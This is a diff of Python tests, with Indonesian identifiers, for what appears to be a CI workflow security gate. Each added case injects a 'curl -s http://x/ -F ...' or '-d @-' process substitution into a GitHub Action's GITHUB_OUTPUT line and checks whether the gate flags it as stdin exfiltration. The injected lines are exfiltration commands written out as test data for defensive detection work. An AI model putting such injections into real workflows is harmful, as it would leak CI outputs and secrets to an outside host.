@@ -42419,6 +42419,132 @@ def _bagian_akhir(tmp):
                     [sys.executable, GERBANG, "--hanya-workflow"])
     periksa("--variable dengan nama tak sah bukan impor stdin (Audit 2966)", rc == 0)
     shutil.rmtree(sub2002, ignore_errors=True)
+    sub2003 = klon(tmp, "sub2003")
+    berkas_aksi2003 = os.path.join(
+        sub2003, ".github", "actions", "resolve-vw",
+        "action.yml")
+    with open(berkas_aksi2003, encoding="utf-8") as f:
+        isi_aksi2003 = f.read()
+    baris_aksi2003 = [b for b in isi_aksi2003.splitlines()
+                      if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+    isi_baru2003 = isi_aksi2003.replace(
+            baris_aksi2003,
+            baris_aksi2003.replace(
+                '>> "$GITHUB_OUTPUT"',
+                "> >(curl -s http://x/ -F 'a=<-;type='; cat >> \"$GITHUB_OUTPUT\")"), 1)
+    assert isi_baru2003 != isi_aksi2003, \
+        "suntikan aksi2003 tidak menembak"
+    with open(berkas_aksi2003, "w", encoding="utf-8") as f:
+        f.write(isi_baru2003)
+    rc, out = jalan(sub2003,
+                    [sys.executable, GERBANG, "--hanya-workflow"])
+    periksa("form type= kosong mati saat urai - bukan sumber stdin (Audit 2980)", rc == 0)
+    shutil.rmtree(sub2003, ignore_errors=True)
+    sub2004 = klon(tmp, "sub2004")
+    berkas_aksi2004 = os.path.join(
+        sub2004, ".github", "actions", "resolve-vw",
+        "action.yml")
+    with open(berkas_aksi2004, encoding="utf-8") as f:
+        isi_aksi2004 = f.read()
+    baris_aksi2004 = [b for b in isi_aksi2004.splitlines()
+                      if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+    isi_baru2004 = isi_aksi2004.replace(
+            baris_aksi2004,
+            baris_aksi2004.replace(
+                '>> "$GITHUB_OUTPUT"',
+                "> >(curl -s http://x/ -F 'a=@-;type='; cat >> \"$GITHUB_OUTPUT\")"), 1)
+    assert isi_baru2004 != isi_aksi2004, \
+        "suntikan aksi2004 tidak menembak"
+    with open(berkas_aksi2004, "w", encoding="utf-8") as f:
+        f.write(isi_baru2004)
+    rc, out = jalan(sub2004,
+                    [sys.executable, GERBANG, "--hanya-workflow"])
+    periksa("form @- type= kosong mati saat urai - bukan sumber stdin (Audit 2980)", rc == 0)
+    shutil.rmtree(sub2004, ignore_errors=True)
+    sub2005 = klon(tmp, "sub2005")
+    berkas_aksi2005 = os.path.join(
+        sub2005, ".github", "actions", "resolve-vw",
+        "action.yml")
+    with open(berkas_aksi2005, encoding="utf-8") as f:
+        isi_aksi2005 = f.read()
+    baris_aksi2005 = [b for b in isi_aksi2005.splitlines()
+                      if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+    isi_baru2005 = isi_aksi2005.replace(
+            baris_aksi2005,
+            baris_aksi2005.replace(
+                '>> "$GITHUB_OUTPUT"',
+                "> >(curl -s http://x/ -F 'a=<-;type=text/plain'; cat >> \"$GITHUB_OUTPUT\")"), 1)
+    assert isi_baru2005 != isi_aksi2005, \
+        "suntikan aksi2005 tidak menembak"
+    with open(berkas_aksi2005, "w", encoding="utf-8") as f:
+        f.write(isi_baru2005)
+    rc, out = jalan(sub2005,
+                    [sys.executable, GERBANG, "--hanya-workflow"])
+    periksa("form type= sah tetap sumber saat-urai (Audit 2980)", rc != 0)
+    shutil.rmtree(sub2005, ignore_errors=True)
+    sub2006 = klon(tmp, "sub2006")
+    berkas_aksi2006 = os.path.join(
+        sub2006, ".github", "actions", "resolve-vw",
+        "action.yml")
+    with open(berkas_aksi2006, encoding="utf-8") as f:
+        isi_aksi2006 = f.read()
+    baris_aksi2006 = [b for b in isi_aksi2006.splitlines()
+                      if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+    isi_baru2006 = isi_aksi2006.replace(
+            baris_aksi2006,
+            baris_aksi2006.replace(
+                '>> "$GITHUB_OUTPUT"',
+                "> >(curl -s http://x/ -F 'a=<-;type=;type=text/plain'; cat >> \"$GITHUB_OUTPUT\")"), 1)
+    assert isi_baru2006 != isi_aksi2006, \
+        "suntikan aksi2006 tidak menembak"
+    with open(berkas_aksi2006, "w", encoding="utf-8") as f:
+        f.write(isi_baru2006)
+    rc, out = jalan(sub2006,
+                    [sys.executable, GERBANG, "--hanya-workflow"])
+    periksa("satu type= sah menyelamatkan bagian form (Audit 2980)", rc != 0)
+    shutil.rmtree(sub2006, ignore_errors=True)
+    sub2007 = klon(tmp, "sub2007")
+    berkas_aksi2007 = os.path.join(
+        sub2007, ".github", "actions", "resolve-vw",
+        "action.yml")
+    with open(berkas_aksi2007, encoding="utf-8") as f:
+        isi_aksi2007 = f.read()
+    baris_aksi2007 = [b for b in isi_aksi2007.splitlines()
+                      if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+    isi_baru2007 = isi_aksi2007.replace(
+            baris_aksi2007,
+            baris_aksi2007.replace(
+                '>> "$GITHUB_OUTPUT"',
+                "> >(curl -s http://x/ -F 'a=<-;type=' -d @-; cat >> \"$GITHUB_OUTPUT\")"), 1)
+    assert isi_baru2007 != isi_aksi2007, \
+        "suntikan aksi2007 tidak menembak"
+    with open(berkas_aksi2007, "w", encoding="utf-8") as f:
+        f.write(isi_baru2007)
+    rc, out = jalan(sub2007,
+                    [sys.executable, GERBANG, "--hanya-workflow"])
+    periksa("type= maut sebelum sumber data - biner mati lebih dulu (Audit 2980)", rc == 0)
+    shutil.rmtree(sub2007, ignore_errors=True)
+    sub2008 = klon(tmp, "sub2008")
+    berkas_aksi2008 = os.path.join(
+        sub2008, ".github", "actions", "resolve-vw",
+        "action.yml")
+    with open(berkas_aksi2008, encoding="utf-8") as f:
+        isi_aksi2008 = f.read()
+    baris_aksi2008 = [b for b in isi_aksi2008.splitlines()
+                      if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+    isi_baru2008 = isi_aksi2008.replace(
+            baris_aksi2008,
+            baris_aksi2008.replace(
+                '>> "$GITHUB_OUTPUT"',
+                "> >(curl -s http://x/ -d @- -F 'a=<-;type='; cat >> \"$GITHUB_OUTPUT\")"), 1)
+    assert isi_baru2008 != isi_aksi2008, \
+        "suntikan aksi2008 tidak menembak"
+    with open(berkas_aksi2008, "w", encoding="utf-8") as f:
+        f.write(isi_baru2008)
+    rc, out = jalan(sub2008,
+                    [sys.executable, GERBANG, "--hanya-workflow"])
+    periksa("sumber data sebelum type= maut tetap menguras (Audit 2980)", rc != 0)
+    shutil.rmtree(sub2008, ignore_errors=True)
     umpanbak = klon(tmp, "umpanbak")
     berkas_ub = os.path.join(umpanbak, ".github", "actions",
                              "resolve-vw", "action.yml")
